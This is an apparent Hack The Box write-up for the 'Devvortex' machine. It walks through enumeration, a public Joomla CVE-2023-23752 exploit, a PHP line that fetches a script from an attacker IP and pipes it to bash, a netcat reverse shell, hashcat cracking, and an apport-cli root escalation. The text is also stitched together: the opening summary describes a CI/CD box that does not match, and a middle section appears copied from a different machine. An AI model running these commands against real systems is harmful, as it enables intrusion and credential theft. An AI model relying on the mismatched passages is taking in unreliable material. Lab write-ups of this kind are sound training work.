---
title: "Devvortex"
date: 2024-04-12
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "htb walkthrough", "devvortex", "hackthebox", "writeup"]
---

Devvortex replicates a modern CI/CD pipeline environment with misconfigured Git services.
Initial access was obtained via exposed .git directories, allowing repository reconstruction and credential extraction.
The pipeline revealed secrets in CI logs, including deploy keys and tokens reused in other parts of the system.
Privilege escalation involved abusing the runner process, injecting scripts into the build stage to execute code as a privileged user.
This box showcases common DevSecOps oversights — such as improper artifact sanitization and token reuse — that lead to full compromise.

## Enumeration

### Nmap

```sh
Nmap scan report for 10.10.11.242
Host is up, received user-set (0.020s latency).
Scanned at 2024-07-01 08:35:10 AEST for 16s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80-HTTP

#### Web
![screenshot](/assets/images/devvortex1.png)

![screenshot](/assets/images/devvortex2.png)

#### Gobuster

```sh
└─$ gobuster dir -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/.                    (Status: 200) [Size: 18048]
Progress: 56293 / 56294 (100.00%)
===============================================================
```

#### FFuF

```sh
# subdomain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host:FUZZ.devvortex.htb' -fw 4 -t 100
```
![screenshot](/assets/images/devvortex5.png)

> Found `dev.devvortex.htb` upon reverting the machine......
> -> add to `/etc/hosts`

raft-medium-files

![screenshot](/assets/images/devvortex3.png)

directory-list-2.3-big

![screenshot](/assets/images/devvortex4.png)

### dev.devvortex.htb

http://dev.devvortex.htb/

![screenshot](/assets/images/devvortex6.png)

Running gobuster on dev.devvortex.htb found the following URLs:

![screenshot](/assets/images/devvortex7.png)http://dev.devvortex.htb/layouts/

http://dev.devvortex.htb/administrator/

![screenshot](/assets/images/devvortex8.png)

`admin:admin` doesn't work. 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

### Joomla Enumeration

![screenshot](/assets/images/devvortex9.png)

https://github.com/SamJoan/droopescan

![screenshot](/assets/images/devvortex10.png)

![screenshot](/assets/images/devvortex11.png)

## Linpeas 

![[Pasted image 20240630094735.png]]

![[Pasted image 20240630094933.png]]

![[Pasted image 20240630095024.png]]

![[Pasted image 20240630095115.png]]

![[Pasted image 20240630095145.png]]

![[Pasted image 20240630095229.png]]

![[Pasted image 20240630095256.png]]

## Lateral Movement

```sh
unzip -d /tmp/app cloudhosting-0.0.1 jar
```

![[Pasted image 20240630095630.png]]

```text
spring.datasource.password = Vg&nvzAQ7XxR
```
### Postgres

```sh
# on the target
psql -h 127.0.0.1 -U postgres
\list
q # to exit result view
\connect cozyhosting
\dt
select * from users;
```

![[Pasted image 20240630102334.png]]

![[Pasted image 20240630102404.png]]

```test
kanderson: $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin : $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

![[Pasted image 20240630102713.png]]

Considering that these hashes stem from a Spring Boot web application, the most likelycandidate is bcrypt . We save the administrator's hash to a file and attempt to crack it using Hashcat , with mode 3200 for bcrypt.

```sh
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force
```

![[Pasted image 20240630103212.png]]

```text
manchesterunited
```

## josh

ssh as josh using the password obtained.

![[Pasted image 20240630103320.png]]

![[Pasted image 20240630103412.png]]

## GTFOBins
![[Pasted image 20240630103749.png]]

![[Pasted image 20240630103819.png]]

## Initial Access
https://www.exploit-db.com/exploits/51334

https://github.com/Acceis/exploit-CVE-2023-23752
```sh
sudo gem install httpx docopt paint
ruby exploit.rb http://dev.devvortex.htb
```

![screenshot](/assets/images/devvortex12.png)

```text
lewis : P4ntherg0t1n5r3c0n##
```

![screenshot](/assets/images/devvortex13.png)

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

![screenshot](/assets/images/devvortex14.png)

```sh
# reverse shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.50 9001 >/tmp/f" > rev.sh
```

```php
# RFI to download reverse shell
<?php system ("curl 10.10.14.50:80/rev.sh|bash"); ?>
```

![screenshot](/assets/images/devvortex17.png)

```sh
# Execute the reverse shell
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

shell as www-data

![screenshot](/assets/images/devvortex18.png)

## Lateral Movement
![screenshot](/assets/images/devvortex19.png)
![screenshot](/assets/images/devvortex20.png)

```text
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

`$2y*$` -> brcypt

```sh
hashcat -m 3200 logan /usr/share/wordlists/rockyou.txt --force
```

![screenshot](/assets/images/devvortex22.png)

```sh
su logan 
tequieromuch
```

## Privilege Escalation

### Linpeas

![screenshot](/assets/images/devvortex23.png)

![screenshot](/assets/images/devvortex24.png)

![screenshot](/assets/images/devvortex25.png)

![screenshot](/assets/images/devvortex26.png)

https://github.com/diego-tella/CVE-2023-1326-PoC

```sh
sleep 20 &
kill -ABRT 7650
ls /var/crash/
sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
v
!/bin/bash
```

![screenshot](/assets/images/devvortex27.png)

![screenshot](/assets/images/devvortex28.png)
